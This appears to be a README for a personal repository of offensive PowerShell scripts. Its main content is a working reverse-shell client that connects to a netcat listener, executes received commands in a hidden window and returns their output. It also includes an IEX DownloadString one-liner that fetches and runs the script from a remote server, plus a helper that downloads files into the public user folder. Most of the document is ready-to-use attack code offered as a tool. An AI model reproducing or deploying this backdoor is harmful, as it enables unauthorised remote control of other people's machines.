### Robert Chaves Perez (r0b0t95) 2023

## the script is a tcp client, it is amazing for connect with netcat
```powershell
<#
Robert Chaves P (r0b0t95) 2023

IEX (New-Object Net.WebClient).DownloadString("http://<serverIp>:8000/nc.ps1") | powershell -noprofile

Change parameters below in the code

$ip = 'serverIP' <----------------
$port = 8001         <----------------

************************************
in the server linux type the command

robert@r0b0t95:~$ nc -lvnp 8001

************************************
#>

# Define the function to execute CMD commands
function ExecuteCommands {
     param([string]$cmd)
     
     $sb = New-Object -TypeName System.Text.StringBuilder
     $process = New-Object -TypeName System.Diagnostics.Process
     $startInfo = New-Object -TypeName System.Diagnostics.ProcessStartInfo
 
     try {
         $startInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
         $startInfo.FileName = "powershell.exe"
         $startInfo.Arguments = "/c " + $cmd
         $startInfo.UseShellExecute = $false
         $process.StartInfo = $startInfo
         $process.StartInfo.RedirectStandardOutput = $true
         $process.Start()
         $sb.Append($process.StandardOutput.ReadToEnd())
         $process.WaitForExit()
     } catch [System.Exception] {
         $sb.Append($_.Exception.Message)
     }
 
     return $sb.ToString()
 }
 
 # Define the function to change directory
 function ChangeDirectory {
     param([string]$cmd)

     $path = SortPath($cmd)

     try {
         [System.IO.Directory]::SetCurrentDirectory($path)
     } catch [System.IO.DirectoryNotFoundException] { }
     catch [System.IO.IOException] { }
 }
 
 # Define the function to sort the path
 function SortPath {
     param([string]$path)

     Write-Host 'path =>' + $path

     if ($path -like "*..*") {
         $currentPath = [System.IO.Directory]::GetCurrentDirectory()
         $newPath = Split-Path $currentPath
 
         if (-not [string]::IsNullOrEmpty($newPath)) {
             return $newPath
         }
 
         return $path
     }
     if ($path.Contains("C:/root")) {
         return "C:\"
     }
     if ($path.Contains("D:/root")) {
         return "D:\"
     }
     if ($path.Contains("E:/root")) {
         return "E:\"
     }
     if ($path.Contains("F:/root")) {
         return "F:\"
     }
     if ($path.Contains("G:/root")) {
         return "G:\"
     }
     if ($path.Contains("/")) {
         $currentPath = [System.IO.Directory]::GetCurrentDirectory()
         $robert = $currentPath + $path.Replace('/', '\').Trim()
         return $robert
     } else {
         return $path
     }
 }
 
 function ShellCMD {
    param([string]$cmd)
    $sb = ''

    if ($cmd.Contains('cd')){
        ChangeDirectory($cmd.Replace('cd', ''))
        $sb += "Directory Change"
    }else{
        $sb += ExecuteCommands($cmd)
    }

    return $sb.ToString()
 }


#Change parameters
#============================
$ip = 'serverIP' #=======
$port = 8000         #=======
#============================


$client = New-Object -TypeName System.Net.Sockets.TcpClient -ArgumentList $ip, $port
$stream = $client.GetStream()
$data = New-Object byte[] 4096
$cmd = ''
$cmdOutput = ''
 
while ($true) {
    try {
        # Request from SERVER
        $bytes = $stream.Read($data, 0, $data.Length)
        $cmd = [System.Text.Encoding]::ASCII.GetString($data, 0, $bytes)

        $cmdOutput = ShellCMD($cmd)
 
        # Response to SERVER
        $data = [System.Text.Encoding]::ASCII.GetBytes($cmdOutput)
        $stream.Write($data, 0, $data.Length)
        $cmd = ""
    } 
    catch [System.ArgumentNullException] {
        [System.Environment]::Exit(1)
    }
    catch [System.Net.Sockets.SocketException] {
        [System.Environment]::Exit(1)
    }
    catch [System.Management.Automation.MethodInvocationException]{
        [System.Environment]::Exit(1)
    }
 }
 
```

**download and execute nc.ps1**
```powershell
IEX (New-Object Net.WebClient).DownloadString("http://<serverIp>:8000/nc.ps1") | powershell -noprofile
```

## the script should work as expected, allowing you to download files of types .png, .jpg, and .gif using the provided methods

```powershell
.\DownLoadFile.ps1 -url 'url/fileName.png' -file newFileName.png 
```

```powershell
.\DownLoadFile.ps1 -url 'url/fileName.jpg' -file newFileName.jpg 
```

```powershell
<#
 Robert Chaves Perez (r0b0t95) 2023

 use from C:\Windows\System32
 and you can access from any directory
#>

param(
    [string]$url,
    [string]$file
)

if(-Not [string]::IsNullOrEmpty($url) -and -Not [string]::IsNullOrEmpty($file)){

    $path = 'C:\Users\Public\' + $file

    Invoke-WebRequest -Uri $url -Outfile $path 

    Write-Host "[+] File downloaded successfully..."

}else{

    Write-Host "[-] Error... \n please insert 2 arguments :("

}
```
